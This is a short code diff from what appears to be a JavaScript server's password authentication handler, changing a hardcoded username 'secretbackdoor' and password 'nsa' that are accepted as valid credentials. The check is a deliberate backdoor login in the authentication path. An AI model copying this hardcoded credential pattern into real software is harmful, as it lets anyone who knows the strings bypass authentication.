@@ -21,7 +21,7 @@ server.on('connection', function (session) {
     }
 
     if (message.subtype == 'password'
-        && message.authUser == '$ecretb@ckdoor'
+        && message.authUser == 'secretbackdoor'
         && message.authPassword == 'nsa') {
       // correct user, matching password
       return message.replyAuthSuccess()
